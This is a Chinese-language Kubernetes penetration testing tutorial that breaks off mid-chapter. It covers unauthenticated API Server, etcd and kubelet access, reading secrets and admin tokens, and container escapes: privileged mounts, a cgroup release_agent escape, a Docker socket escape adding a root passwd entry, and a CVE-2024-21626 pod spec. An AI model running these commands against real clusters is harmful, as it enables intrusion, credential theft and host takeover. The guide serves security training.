# Kubernetes渗透测试实战

> **适用人群**：云安全工程师、渗透测试工程师、DevSecOps工程师、红队队员
> **前置知识**：熟悉Kubernetes基本概念、掌握Linux系统操作、具备渗透测试基础
> **学习目标**：系统掌握K8s渗透测试方法论与实战技术，能够独立完成K8s集群安全评估

---

## 第1章 Kubernetes安全架构概述

### 1.1 K8s核心组件与安全边界

#### 1.1.1 Kubernetes架构回顾

Kubernetes采用主从（Master-Worker）分布式架构，由控制平面（Control Plane）和数据平面（Data Plane）组成。

```
┌──────────────────────────────────────────────────────────┐
│                    Control Plane                         │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐   │
│  │API Server│ │Scheduler │ │Controller│ │   etcd   │   │
│  │          │ │          │ │ Manager  │ │          │   │
│  └────┬─────┘ └──────────┘ └────┬─────┘ └────┬─────┘   │
│       │                         │             │          │
│       └─────────────────────────┴─────────────┘          │
└────────────────────────────┬─────────────────────────────┘
                             │ HTTPS
            ┌────────────────┴────────────────┐
            │                                 │
┌───────────▼───────────┐         ┌───────────▼───────────┐
│     Worker Node 1     │         │     Worker Node 2     │
│  ┌─────────────────┐  │         │  ┌─────────────────┐  │
│  │   kubelet       │  │         │  │   kubelet       │  │
│  ├─────────────────┤  │         │  ├─────────────────┤  │
│  │   kube-proxy    │  │         │  │   kube-proxy    │  │
│  ├─────────────────┤  │         │  ├─────────────────┤  │
│  │ container runtime│ │         │  │ container runtime│ │
│  ├─────────────────┤  │         │  ├─────────────────┤  │
│  │ Pods            │  │         │  │ Pods            │  │
│  │ ┌──┐ ┌──┐ ┌──┐  │  │         │  │ ┌──┐ ┌──┐ ┌──┐  │  │
│  │ │P1│ │P2│ │P3│  │  │         │  │ │P4│ │P5│ │P6│  │  │
│  │ └──┘ └──┘ └──┘  │  │         │  │ └──┘ └──┘ └──┘  │  │
│  └─────────────────┘  │         │  └─────────────────┘  │
└───────────────────────┘         └───────────────────────┘
```

#### 1.1.2 各组件安全职责

**API Server（kube-apiserver）：**
- 集群的唯一入口，所有组件通过API Server交互
- 负责认证（Authentication）、授权（Authorization）、准入控制（Admission Control）
- 是渗透测试的首要目标，获取API Server权限等于控制集群

**etcd：**
- 集群的分布式键值存储，保存所有集群状态数据
- 存储了所有Secret、配置、服务账户令牌等敏感信息
- 如果etcd被攻破，相当于集群完全沦陷

**kubelet：**
- 运行在每个节点上的代理，管理节点上的Pod
- 默认监听10250端口和10255端口
- 未授权访问kubelet可直接执行Pod命令、读取日志

**kube-proxy：**
- 维护节点上的网络规则，实现Service抽象
- 本身攻击面较小，但配置错误可能导致网络绕过

**Scheduler：**
- 负责Pod调度决策
- 直接攻击价值较低，但可被利用实现拒绝服务

**Controller Manager：**
- 运行各类控制器（Node Controller、Replica Controller等）
- 拥有较高权限的服务账户

#### 1.1.3 安全边界划分

K8s集群存在多层安全边界：

| 边界层级 | 描述 | 攻破难度 | 影响范围 |
|---------|------|---------|---------|
| 外部网络边界 | 集群外部访问入口 | 低 | 取决于暴露的服务 |
| Pod边界 | Pod之间的隔离 | 中 | 单个Pod内的数据 |
| 节点边界 | 容器与宿主机的隔离 | 中高 | 整个节点及节点上的Pod |
| 命名空间边界 | Namespace资源隔离 | 中 | 同一Namespace内的资源 |
| 集群控制平面 | API Server等核心组件 | 高 | 整个集群 |

### 1.2 K8s认证与授权机制

#### 1.2.1 认证机制（Authentication）

K8s支持多种认证方式，用于验证请求者的身份：

**1. X.509客户端证书认证**
- 最常用的认证方式，kubeconfig通常使用证书认证
- 证书中的CN字段作为用户名，O字段作为用户组
- 证书一旦签发无法吊销，只能等待过期

**2. 静态Token文件**
- 使用静态CSV文件存储Token
- 生产环境不推荐使用，难以管理

**3. Bootstrap Token**
- 用于节点加入集群时的初始认证
- Token格式：`[a-z0-9]{6}.[a-z0-9]{16}`
- 通常存储在kube-system命名空间的Secret中

**4. Service Account Token**
- Pod内部使用的服务账户令牌
- 自动挂载到Pod的`/var/run/secrets/kubernetes.io/serviceaccount/token`
- 是横向移动的重要凭证

**5. OpenID Connect (OIDC)**
- 基于OAuth2的身份认证
- 与外部身份提供商集成（Google、Azure AD等）

**6. Webhook Token认证**
- 通过外部HTTP服务验证Token
- 灵活但增加了外部依赖

#### 1.2.2 授权机制（Authorization）

认证通过后，K8s使用授权机制决定用户能做什么操作。

**RBAC（Role-Based Access Control）：**
- K8s默认启用的授权机制
- 基于角色的访问控制
- 核心对象：Role、ClusterRole、RoleBinding、ClusterRoleBinding

**RBAC权限矩阵：**

| 资源 | 动词 | 说明 |
|------|------|------|
| pods | get, list, watch | 查看Pod信息 |
| pods | create, update, patch | 创建/修改Pod |
| pods | delete, deletecollection | 删除Pod |
| pods/exec | create | 在Pod中执行命令 |
| secrets | get, list, watch | 查看Secret |
| secrets | create, update | 创建/修改Secret |
| serviceaccounts | impersonate | 模拟其他服务账户 |
| nodes | get, list, proxy | 访问节点 |

**高危权限组合：**
- `pods/exec` + `pods`：可直接进入Pod执行命令
- `secrets` get/list：可读取敏感凭证
- `serviceaccounts` create + `clusterrolebindings` create：可创建管理员权限账户
- `pods` create + 特权容器权限：可逃逸到宿主机
- `nodes` proxy：可通过API Server代理访问kubelet

#### 1.2.3 准入控制（Admission Control）

准入控制器在API对象持久化到etcd之前拦截请求，执行额外的校验或修改。

**安全相关的准入控制器：**
- `AlwaysPullImages`：强制总是拉取最新镜像
- `PodSecurityPolicy`（已弃用，被PSA取代）：Pod安全策略
- `PodSecurity`：Pod安全准入，替代PSP
- `NodeRestriction`：限制kubelet的权限
- `ServiceAccount`：自动管理Service Account
- `DenyEscalatingExec`：禁止在特权容器中exec

### 1.3 K8s安全最佳实践概览

**控制平面安全：**
- API Server启用TLS和强认证
- etcd启用TLS加密和访问控制
- 控制平面组件间通信加密
- 定期轮换证书

**工作节点安全：**
- 禁用kubelet匿名访问
- 限制kubelet端口暴露
- 节点操作系统加固
- 容器运行时安全配置

**工作负载安全：**
- 禁止特权容器
- 限制容器能力（Capabilities）
- 设置安全上下文（Security Context）
- 使用只读根文件系统
- 禁止hostPath、hostNetwork等危险配置

**网络安全：**
- 使用NetworkPolicy限制Pod间通信
- 启用Service Mesh进行东西向流量加密
- 限制Ingress和Egress流量

**身份与访问管理：**
- 遵循最小权限原则
- 定期审计RBAC配置
- 启用审计日志
- 使用命名空间进行隔离

---

## 第2章 K8s渗透测试方法论

### 2.1 信息收集阶段

#### 2.1.1 阶段目标

信息收集是渗透测试的第一步，目标是尽可能全面地了解目标K8s集群的架构、暴露面和潜在弱点。

**核心任务：**
- 发现K8s相关服务和端口
- 获取集群基本信息（版本、节点、命名空间等）
- 识别可访问的API端点
- 收集可能泄露的配置信息
- 发现可利用的服务和应用

#### 2.1.2 信息收集分类

| 类别 | 具体内容 | 工具/方法 |
|------|---------|----------|
| 网络探测 | API Server、kubelet、etcd端口发现 | nmap、masscan |
| API探测 | API版本、认证方式、可用资源 | kubectl、curl |
| 集群信息 | 节点数、命名空间、运行的Pod | kubectl get/describe |
| 配置泄露 | kubeconfig、ServiceAccount Token | 目录扫描、文件泄露 |
| 应用识别 | 运行的服务、版本信息 | Service枚举、端口探测 |

### 2.2 权限获取阶段

#### 2.2.1 权限获取路径

获取K8s集群访问权限的常见路径：

1. **未授权访问API Server**
   - API Server允许匿名访问
   - 认证配置错误（如--anonymous-auth=true且RBAC配置宽松）

2. **通过Web应用获取凭证**
   - 应用中泄露的ServiceAccount Token
   - 容器内文件读取漏洞
   - SSRF漏洞访问元数据服务

3. **通过kubelet获取权限**
   - kubelet未授权访问（10250端口）
   - kubelet只读端口信息泄露（10255端口）

4. **通过Dashboard获取权限**
   - Dashboard未授权访问
   - Dashboard使用高权限ServiceAccount

5. **通过etcd获取权限**
   - etcd未启用认证
   - etcd证书泄露

#### 2.2.2 权限等级划分

| 权限等级 | 描述 | 典型能力 |
|---------|------|---------|
| L0 - 无权限 | 完全无法访问API | 只能进行外部探测 |
| L1 - 只读权限 | 可查看集群资源信息 | list/get pods, services, nodes |
| L2 - 普通用户权限 | 可操作部分资源 | 部署自己的Pod，访问指定Secret |
| L3 - 命名空间管理员 | 拥有命名空间内全部权限 | 命名空间内所有操作 |
| L4 - 集群管理员 | 拥有整个集群权限 | 所有操作，包括节点管理 |
| L5 - 节点级权限 | 可控制宿主机 | 容器逃逸后获得的节点权限 |

### 2.3 横向移动阶段

#### 2.3.1 横向移动目标

从一个Pod或账户扩展到更多Pod、命名空间或节点。

**常见横向移动路径：**
- Pod → Pod（同节点/跨节点网络访问）
- Pod → Secret → 其他Pod/服务
- Pod → ServiceAccount → 更多API权限
- Pod → 节点 → 节点上所有Pod
- 命名空间A → 命名空间B（通过共享资源或配置错误）

### 2.4 权限提升阶段

#### 2.4.1 权限提升路径

从低权限提升到更高权限的技术手段：

1. **RBAC配置错误利用**
   - 服务账户拥有过高权限
   - 可创建/修改RoleBinding
   - 可impersonate其他用户

2. **容器逃逸**
   - 特权容器逃逸
   - 宿主文件系统挂载逃逸
   - 内核漏洞利用

3. **节点权限获取**
   - 通过kubelet获取节点访问权
   - 通过Pod安全配置错误逃逸到节点

4. **集群管理员权限获取**
   - 利用管理员级别的ServiceAccount
   - 通过etcd直接操作集群状态

### 2.5 持久化阶段

#### 2.5.1 持久化目标

在获取权限后建立长期访问机制，即使部分凭证被吊销仍能维持访问。

**常见持久化技术：**
- 部署后门Pod
- 创建高权限ServiceAccount
- 利用CronJob定期执行
- 篡改控制器（Deployment、DaemonSet）
- 节点级后门（SSH密钥、Rootkit）
- 控制平面持久化（篡改API Server配置）

---

## 第3章 信息收集与侦察

### 3.1 K8s API Server探测

#### 3.1.1 API Server端口发现

API Server通常监听以下端口：
- 6443：标准HTTPS端口（Kubeadm安装默认）
- 443：常用的HTTPS端口（云厂商托管集群常见）
- 8443：开发环境常用端口（如minikube）
- 8080：不安全的HTTP端口（默认禁用，老版本可能存在）

**使用nmap探测：**
```bash
# 探测常见K8s端口
nmap -sV -p 6443,443,8443,8080,10250,10255,2379,2380 <target>

# 更全面的扫描
nmap -sS -p- --open -T4 <target>
```

**API Server特征识别：**
```bash
# 访问API端点获取版本信息
curl -k https://<api-server>:6443/version

# 正常响应示例
{
  "major": "1",
  "minor": "28",
  "gitVersion": "v1.28.1",
  "gitCommit": "8dc49c4b984b89791892a7eb3870e42e6d37e041",
  "buildDate": "2023-08-24T14:15:56Z",
  "goVersion": "go1.20.7",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

#### 3.1.2 认证方式探测

```bash
# 测试匿名访问
curl -k https://<api-server>:6443/api/v1/pods

# 如果返回401 Unauthorized，说明需要认证
# 如果返回403 Forbidden，说明已认证但无权限
# 如果返回Pod列表，说明匿名访问可用且权限较高

# 查看API支持的认证方式
curl -k https://<api-server>:6443/.well-known/openid-configuration 2>/dev/null

# 查看API组和资源
curl -k https://<api-server>:6443/api/v1
curl -k https://<api-server>:6443/apis
```

### 3.2 集群信息收集

#### 3.2.1 获取集群基本信息

```bash
# 集群信息
kubectl cluster-info
kubectl version

# 节点信息
kubectl get nodes -o wide
kubectl describe node <node-name>

# 命名空间
kubectl get namespaces

# 服务账户
kubectl get serviceaccounts --all-namespaces
```

#### 3.2.2 版本信息利用

K8s版本信息对渗透测试非常重要，不同版本存在不同的已知漏洞。

**常见CVE漏洞对应版本：**
- CVE-2024-21626：runc文件描述符泄漏导致容器逃逸（runc < 1.1.12）
- CVE-2022-0185：Linux内核`fsconfig`系统调用漏洞容器逃逸（Kernel < 5.16.2）
- CVE-2022-23648：containerd路径遍历（containerd < 1.6.1）
- CVE-2021-25741：symlink交换导致容器逃逸（K8s 1.22.2以下）
- CVE-2020-8555：kube-controller-manager SSRF（K8s 1.18-1.19）
- CVE-2019-11253：API Server YAML解析拒绝服务（K8s 1.13-1.16）

### 3.3 Pod与服务枚举

#### 3.3.1 Pod枚举

```bash
# 列出所有命名空间的Pod
kubectl get pods --all-namespaces -o wide

# 查看Pod详细信息（包括镜像、挂载、安全配置）
kubectl describe pod <pod-name> -n <namespace>

# 查看Pod的YAML定义
kubectl get pod <pod-name> -n <namespace> -o yaml

# 筛选特权容器
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# 筛选挂载了宿主机路径的Pod
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].hostPath!=null) | .metadata.name'
```

#### 3.3.2 Service枚举

```bash
# 列出所有服务
kubectl get svc --all-namespaces -o wide

# 查看服务详情
kubectl describe svc <svc-name> -n <namespace>

# 查看Endpoint
kubectl get endpoints --all-namespaces

# 查找NodePort和LoadBalancer服务
kubectl get svc --all-namespaces | grep -E 'NodePort|LoadBalancer'
```

#### 3.3.3 Ingress枚举

```bash
# 列出所有Ingress
kubectl get ingress --all-namespaces

# 查看Ingress详情
kubectl describe ingress <ingress-name> -n <namespace>
```

### 3.4 配置信息泄露

#### 3.4.1 Secret与ConfigMap枚举

```bash
# 列出所有Secret
kubectl get secrets --all-namespaces

# 查看Secret内容
kubectl get secret <secret-name> -n <namespace> -o yaml

# 解码Secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq .
echo '<base64-value>' | base64 -d

# 列出ConfigMap
kubectl get configmaps --all-namespaces
kubectl get configmap <name> -n <namespace> -o yaml
```

#### 3.4.2 常见敏感信息来源

| 来源 | 可能包含的敏感信息 |
|------|-----------------|
| Secret | 密码、API密钥、TLS证书、Docker config、token |
| ConfigMap | 配置文件中的凭证、连接字符串、密钥 |
| Pod环境变量 | 数据库密码、API密钥 |
| 容器日志 | 打印的敏感信息、堆栈跟踪 |
| kube-system命名空间 | 集群组件配置、网络插件凭证 |

---

## 第4章 常见漏洞与攻击面

### 4.1 API Server未授权访问

#### 4.1.1 漏洞描述

API Server是K8s集群的核心入口，如果配置不当允许匿名访问或弱认证，攻击者可直接控制整个集群。

**常见原因：**
- 启用了匿名认证（`--anonymous-auth=true`）且RBAC配置宽松
- 使用了不安全的HTTP端口（8080）
- 证书验证配置错误
- 服务账户权限过大

#### 4.1.2 漏洞检测

```bash
# 测试匿名访问
curl -k https://<api-server>:6443/api/v1/pods

# 测试只读端口（老版本）
curl http://<api-server>:8080/api/v1/pods

# 使用kubectl测试（不指定kubeconfig）
kubectl --insecure-skip-tls-verify --server=https://<api-server>:6443 get pods
```

**判断结果：**
- 返回Pod列表 → 严重：匿名用户有Pod读取权限
- 返回403 Forbidden → 已认证但无权限（匿名认证已启用）
- 返回401 Unauthorized → 匿名认证被禁用

#### 4.1.3 利用方法

如果API Server允许匿名访问且有一定权限：

```bash
# 1. 枚举所有资源
kubectl --server=https://<api-server>:6443 --insecure-skip-tls-verify api-resources

# 2. 查看Secret
kubectl --server=https://<api-server>:6443 --insecure-skip-tls-verify get secrets -n kube-system -o yaml

# 3. 获取管理员Token
kubectl --server=https://<api-server>:6443 --insecure-skip-tls-verify get secret -n kube-system | grep token
# 找到类似 cluster-admin-token-xxxxx 的Secret

# 4. 使用Token获取更高权限
TOKEN=$(kubectl --server=... get secret cluster-admin-token-xxxxx -n kube-system -o jsonpath='{.data.token}' | base64 -d)
kubectl --server=... --token=$TOKEN get pods --all-namespaces
```

### 4.2 etcd未授权访问

#### 4.2.1 漏洞描述

etcd是K8s的分布式存储，保存了所有集群状态和Secret。如果etcd未启用认证或认证配置不当，攻击者可直接读取和修改所有集群数据。

**etcd默认端口：**
- 2379：客户端通信端口
- 2380：集群内部通信端口

#### 4.2.2 漏洞检测

```bash
# 使用etcdctl测试
etcdctl --endpoints=https://<etcd-ip>:2379 --insecure-transport --insecure-skip-tls-verify endpoint health

# 使用curl测试
curl -k https://<etcd-ip>:2379/health
curl -k https://<etcd-ip>:2379/v2/keys/

# v3 API
curl -k -X POST https://<etcd-ip>:2379/v3/kv/put \
  -d '{"key": "dGVzdA==", "value": "dmFsdWU="}'
```

#### 4.2.3 利用方法

```bash
# 1. 列出所有键（v3 API）
etcdctl --endpoints=https://<etcd-ip>:2379 --insecure-transport --insecure-skip-tls-verify get / --prefix --keys-only

# 2. 获取所有Secret
etcdctl --endpoints=... get /registry/secrets/ --prefix

# 3. 获取特定Secret
etcdctl --endpoints=... get /registry/secrets/kube-system/cluster-admin-token-xxxxx

# 4. 直接修改集群状态（高危）
# 例如：修改Pod定义、创建新的Secret等
```

**通过etcd获取管理员权限：**
```bash
# 1. 获取集群管理员的ServiceAccount Token
# 2. 或者直接在etcd中创建一个新的管理员用户
# 3. 利用获取的凭证访问API Server
```

### 4.3 kubelet未授权访问

#### 4.3.1 漏洞描述

kubelet运行在每个节点上，默认监听10250（HTTPS）和10255（HTTP只读）端口。如果kubelet配置了匿名认证，攻击者可以直接管理节点上的Pod。

**kubelet端口：**
- 10250：kubelet API（HTTPS），支持Pod管理操作
- 10255：只读端口（HTTP），提供Pod和节点信息
- 10248：健康检查端口

#### 4.3.2 漏洞检测

```bash
# 测试10255只读端口
curl http://<node-ip>:10255/pods
curl http://<node-ip>:10255/nodes
curl http://<node-ip>:10255/spec

# 测试10250端口匿名访问
curl -k https://<node-ip>:10250/pods

# 测试exec能力
curl -k -X POST "https://<node-ip>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=id"
```

#### 4.3.3 利用方法

**获取Pod列表：**
```bash
curl -s http://<node-ip>:10255/pods | jq '.items[] | .metadata.namespace + "/" + .metadata.name'
```

**在Pod中执行命令：**
```bash
# 使用kubelet API执行命令
curl -k -X POST \
  "https://<node-ip>:10250/run/default/nginx-pod/nginx" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# 返回的Token可用于访问API Server
```

**获取节点权限：**
```bash
# 如果节点上有特权Pod，可通过kubelet exec进入后逃逸
# 或者利用kubelet的pods接口创建新Pod（需要认证）
```

### 4.4 Dashboard未授权访问

#### 4.4.1 漏洞描述

Kubernetes Dashboard是官方的Web UI，常用于集群管理。如果Dashboard配置不当，可能存在未授权访问或使用高权限ServiceAccount的问题。

**Dashboard常见部署位置：**
- 路径：`/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/`
- 独立Ingress暴露
- NodePort方式暴露

#### 4.4.2 漏洞检测

```bash
# 检查Dashboard是否存在
kubectl get svc -n kubernetes-dashboard
kubectl get pods -n kubernetes-dashboard

# 测试Dashboard访问
curl -k https://<api-server>:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# 检查Dashboard的ServiceAccount权限
kubectl describe sa kubernetes-dashboard -n kubernetes-dashboard
kubectl get rolebindings,clusterrolebindings -n kubernetes-dashboard | grep dashboard
```

#### 4.4.3 利用方法

**如果Dashboard有管理员权限：**
1. 直接通过Dashboard部署恶意Pod
2. 读取所有Secret
3. 创建新的管理员账户
4. 修改集群配置

**获取Dashboard的ServiceAccount Token：**
```bash
# 查看Dashboard使用的ServiceAccount
kubectl get deploy kubernetes-dashboard -n kubernetes-dashboard -o yaml | grep serviceAccount

# 获取Token
kubectl get secret -n kubernetes-dashboard | grep dashboard-token
kubectl get secret <dashboard-token-name> -n kubernetes-dashboard -o jsonpath='{.data.token}' | base64 -d
```

### 4.5 Service Account令牌泄露

#### 4.5.1 漏洞描述

默认情况下，每个Pod都会挂载一个Service Account Token到`/var/run/secrets/kubernetes.io/serviceaccount/token`。如果攻击者能够读取这个Token，就可以使用该服务账户的权限访问API Server。

**Token泄露途径：**
- 容器内文件读取漏洞
- 应用程序日志泄露
- 环境变量泄露
- SSRF漏洞读取Token文件
- 容器镜像中包含Token

#### 4.5.2 获取ServiceAccount Token

```bash
# 在Pod内获取Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 获取命名空间
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# 获取CA证书
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 通过API Server访问
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get pods
```

#### 4.5.3 利用Token提升权限

```bash
# 1. 查看当前Token的权限
kubectl --token=$TOKEN auth can-i --list

# 2. 如果有create pods权限，创建特权Pod
# 3. 如果有get secrets权限，读取更高权限的Secret
# 4. 如果有impersonate权限，模拟其他用户
kubectl --token=$TOKEN --as=system:serviceaccount:kube-system:default get pods --all-namespaces

# 5. 如果有create rolebindings权限，绑定管理员角色
```

### 4.6 ConfigMap/Secret泄露

#### 4.6.1 敏感信息类型

**Secret中常见的敏感信息：**
- TLS证书和私钥
- Docker镜像仓库凭证（`.dockerconfigjson`）
- 数据库密码
- API密钥
- SSH密钥
- Service Account Token

**ConfigMap中的敏感信息：**
- 应用配置文件中的凭证
- 连接字符串
- 环境变量配置

#### 4.6.2 利用Docker Registry Secret

```bash
# 获取Docker配置Secret
kubectl get secret <registry-secret> -n <namespace> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# 输出示例
{
  "auths": {
    "registry.example.com": {
      "username": "deploy-user",
      "password": "registry-password",
      "auth": "ZGVwbG95LXVzZXI6cmVnaXN0cnktcGFzc3dvcmQ="
    }
  }
}

# 利用：登录镜像仓库，获取私有镜像，可能发现更多凭证
docker login registry.example.com -u deploy-user -p registry-password
docker pull registry.example.com/private-app:latest
```


---

## 第5章 容器逃逸技术

### 5.1 特权容器逃逸

#### 5.1.1 特权容器概述

特权容器（Privileged Container）是以`--privileged`标志运行的容器，拥有宿主机的所有能力。特权容器几乎没有安全限制，可以直接访问宿主机的所有设备。

**判断是否为特权容器：**
```bash
# 方法1：查看容器的安全上下文
cat /proc/self/status | grep -i cap
# 如果CapEff为0000003fffffffff，则拥有全部能力

# 方法2：检查devices目录
ls -la /dev/ | wc -l
# 特权容器可以看到所有宿主机设备

# 方法3：尝试加载内核模块
modprobe dm-mod
# 如果成功，说明是特权容器
```

**Pod YAML中的特权配置：**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: test
    image: alpine
    securityContext:
      privileged: true  # 特权模式
    command: ["sleep", "infinity"]
```

#### 5.1.2 利用特权容器逃逸

**方法1：通过/dev挂载宿主机磁盘**
```bash
# 查看宿主机磁盘设备
fdisk -l
lsblk

# 挂载宿主机根文件系统
mkdir /host
mount /dev/sda1 /host  # 根据实际磁盘设备调整

# 进入宿主机环境
chroot /host /bin/bash

# 或者直接读写宿主机文件
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
```

**方法2：通过cgroup v1逃逸（release_agent）**
```bash
# 利用cgroup v1的release_agent机制
# 创建一个新的cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 启用notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 获取宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 设置release_agent（逃逸命令）
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 创建命令脚本
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd

# 触发cgroup release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```

**方法3：利用内核模块加载**
```bash
# 特权容器可以加载内核模块
# 创建一个恶意内核模块获取root权限

# 或者直接通过/dev/mem访问物理内存
# （需要内核支持/dev/mem）
```

### 5.2 宿主文件系统挂载逃逸

#### 5.2.1 hostPath挂载风险

当容器挂载了宿主机的敏感目录时，攻击者可以通过读写这些目录实现逃逸。

**常见危险挂载：**
- `/` 或 `/root`：宿主机根目录或root目录
- `/var/run/docker.sock`：Docker套接字
- `/proc`：宿主机proc文件系统
- `/sys`：宿主机sys文件系统
- `/etc`：宿主机配置目录
- `/var/lib/kubelet`：kubelet目录

#### 5.2.2 利用Docker Socket逃逸

如果容器挂载了`/var/run/docker.sock`，可以直接通过Docker API控制宿主机上的所有容器。

```bash
# 检查Docker Socket是否可用
ls -la /var/run/docker.sock

# 查看宿主机上的容器
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 创建新的特权容器并挂载宿主机根目录
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "/bin/bash"],
    "Binds": ["/:/host"],
    "Privileged": true
  }'

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/<container-id>/start"

# 或者直接在宿主机上执行命令
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "echo \"attacker::0:0:root:/root:/bin/bash\" >> /host/etc/passwd"],
    "Binds": ["/etc:/host/etc"]
  }'
```

#### 5.2.3 利用kubelet挂载逃逸

如果挂载了`/var/lib/kubelet`或`/etc/kubernetes`目录，可以获取节点上的kubelet配置和凭证。

```bash
# 读取kubelet配置
cat /host/var/lib/kubelet/config.yaml
cat /host/etc/kubernetes/kubelet.conf

# 获取kubelet证书
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem

# 获取Pod manifest（静态Pod）
ls /host/etc/kubernetes/manifests/

# 读取所有Pod的ServiceAccount Token
find /host/var/lib/kubelet/pods -name token -exec cat {} \;
```

### 5.3 内核漏洞利用逃逸

#### 5.3.1 常见内核漏洞

容器本质上是共享宿主机内核的进程，因此内核漏洞可以直接导致容器逃逸。

| CVE编号 | 漏洞描述 | 影响版本 | 利用难度 |
|---------|---------|---------|---------|
| CVE-2024-21626 | runc文件描述符泄漏 | runc < 1.1.12 | 中 |
| CVE-2022-0185 | fsconfig堆溢出 | Linux 5.1-5.16.2 | 中高 |
| CVE-2021-22555 | netfilter越界写 | Linux 2.6-5.12 | 中 |
| CVE-2020-14386 | AF_PACKET内存损坏 | Linux 4.6-5.9 | 中 |
| CVE-2019-5736 | runc容器逃逸 | runc < 1.0-rc7 | 高（简单） |

#### 5.3.2 CVE-2024-21626 漏洞利用

这是runc的一个文件描述符泄漏漏洞，攻击者可以通过在容器内打开`/proc/self/fd/7`来访问宿主机文件系统。

```bash
# 利用条件：runc版本 < 1.1.12
# 检查runc版本
runc --version

# 利用方法：
# 1. 在容器启动时，工作目录设置为/proc/self/fd/7
# 2. 容器启动后，当前目录即为宿主机根文件系统

# 在K8s中利用：
# 修改Pod的workingDir为/proc/self/fd/7
apiVersion: v1
kind: Pod
metadata:
  name: cve-2024-21626
spec:
  containers:
  - name: test
    image: alpine
    workingDir: /proc/self/fd/7  # 触发漏洞
    command: ["sleep", "infinity"]
```

#### 5.3.3 dirty pipe（CVE-2022-0847）利用

Dirty Pipe是Linux内核的一个漏洞，允许非特权用户写入任意只读文件。在容器中利用此漏洞可以修改宿主机的文件。

```bash
# 影响版本：Linux 5.8 - 5.16.11/5.15.25/5.10.102
# 检查内核版本
uname -r

# 利用思路：
# 1. 创建管道并填充数据
# 2. splice将目标文件页放入管道
# 3. 向管道写入新数据，修改文件页
# 4. 修改的页面会写回到文件缓存

# 典型利用目标：
# - 修改/etc/passwd添加root用户
# - 修改/etc/shadow设置密码
# - 注入SSH公钥
# - 修改容器运行时二进制
```

### 5.4 cgroup/namespace绕过

#### 5.4.1 Namespace隔离机制

Linux Namespace是容器隔离的基础，共有7种Namespace：

| Namespace | 系统调用参数 | 隔离内容 |
|-----------|-------------|---------|
| UTS | CLONE_NEWUTS | 主机名和域名 |
| IPC | CLONE_NEWIPC | 信号量、消息队列、共享内存 |
| PID | CLONE_NEWPID | 进程编号 |
| Network | CLONE_NEWNET | 网络设备、栈、端口 |
| Mount | CLONE_NEWNS | 文件系统挂载点 |
| User | CLONE_NEWUSER | 用户和用户组 |
| Cgroup | CLONE_NEWCGROUP | cgroup根目录 |

#### 5.4.2 Namespace逃逸思路

**User Namespace逃逸：**
User Namespace允许容器内的root用户映射到宿主机的普通用户。如果映射配置错误，可能导致容器内root拥有宿主机root权限。

```bash
# 检查User Namespace映射
cat /proc/self/uid_map
# 如果宿主机root(0)也被映射到容器root，就存在风险
```

**Mount Namespace逃逸：**
通过某些系统调用可以绕过Mount Namespace限制，访问宿主机文件系统。

```bash
# 利用pivot_root
# 利用mount --move
# 利用symlink + procfs
```

#### 5.4.3 cgroup逃逸

cgroup用于限制容器的资源使用。某些cgroup特性可被利用实现逃逸。

**cgroup v1 release_agent逃逸（已在特权容器章节介绍）**

**cgroup v2逃逸：**
cgroup v2中release_agent已被移除，但仍有其他攻击面：
- 通过cgroup的device controller绕过设备限制
- 利用cgroup的io controller进行IO侧信道攻击
- cgroup v1和v2混合模式下的绕过

---

## 第6章 横向移动与权限提升

### 6.1 Pod到Pod横向移动

#### 6.1.1 网络层面横向移动

默认情况下，K8s集群内Pod之间网络是全通的，没有网络隔离。攻击者可以在一个Pod内扫描和访问其他Pod。

**Pod内网络探测：**
```bash
# 获取Pod的IP和网段
ip addr
ip route

# 扫描同一网段内的其他Pod
for i in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.244.0.$i/80" 2>/dev/null && echo "10.244.0.$i:80 open" &
done
wait

# 探测Service网络
# 通常Service网段是10.96.0.0/12
for i in $(seq 1 100); do
  timeout 1 bash -c "echo >/dev/tcp/10.96.0.$i/443" 2>/dev/null && echo "10.96.0.$i:443 open" &
done
wait
```

#### 6.1.2 利用应用漏洞横向移动

**常见横向移动向量：**
- 其他Pod中的Web应用漏洞（RCE、SQL注入）
- 未授权访问的服务（Redis、MongoDB、Elasticsearch）
- 服务间调用的API接口漏洞
- 消息队列中的消息窃取和篡改

**利用Redis未授权访问：**
```bash
# 连接Redis
